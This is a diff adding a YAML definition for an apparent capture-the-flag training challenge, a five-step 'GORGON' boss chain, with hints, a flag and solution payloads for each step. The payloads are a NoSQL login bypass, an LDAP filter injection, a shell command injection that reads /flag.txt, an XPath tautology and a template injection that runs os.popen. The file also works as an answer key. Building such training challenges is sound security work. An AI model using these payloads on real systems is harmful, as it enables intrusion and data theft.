@@ -1,0 +1,38 @@
+id: boss-gorgon
+title: "GORGON — Turn to Stone"
+category: boss
+difficulty: boss
+cvss: 9.7
+owasp: A03:2021 – Injection
+endpoint: /boss/gorgon
+description: "A 5-step boss chain exploiting NoSQL injection, LDAP injection, command injection, XPATH injection, and template injection sequentially."
+hints:
+  - "Step 1: NoSQL injection in MongoDB login. Use $ne operator."
+  - "Step 2: LDAP injection in user search. Use * wildcard."
+  - "Step 3: Command injection in ping utility."
+  - "Step 4: XPATH injection in XML document query."
+  - "Step 5: SSTI in error template after all prior injections."
+flag: "BHEDA{boss_gorgon_complete}"
+flag_location: "SSTI output on error page"
+solution_summary: "NoSQLi -> LDAPi -> CMDi -> XPATHi -> SSTI chain exploit"
+steps:
+  - id: gorgon-1
+    description: "NoSQL injection in login form"
+    endpoint: /boss/gorgon/login
+    solution: "{\"username\":{\"$ne\":\"\"},\"password\":{\"$ne\":\"\"}}"
+  - id: gorgon-2
+    description: "LDAP injection in directory search"
+    endpoint: /boss/gorgon/search
+    solution: "*)(uid=*))(|(uid=*"
+  - id: gorgon-3
+    description: "Command injection in ping"
+    endpoint: /boss/gorgon/ping
+    solution: "; cat /flag.txt #"
+  - id: gorgon-4
+    description: "XPATH injection in XML query"
+    endpoint: /boss/gorgon/xml
+    solution: "' OR '1'='1"
+  - id: gorgon-5
+    description: "SSTI in error template rendering"
+    endpoint: /boss/gorgon/error
+    solution: "{{config.__class__.__init__.__globals__['os'].popen('cat flag.txt').read()}}"
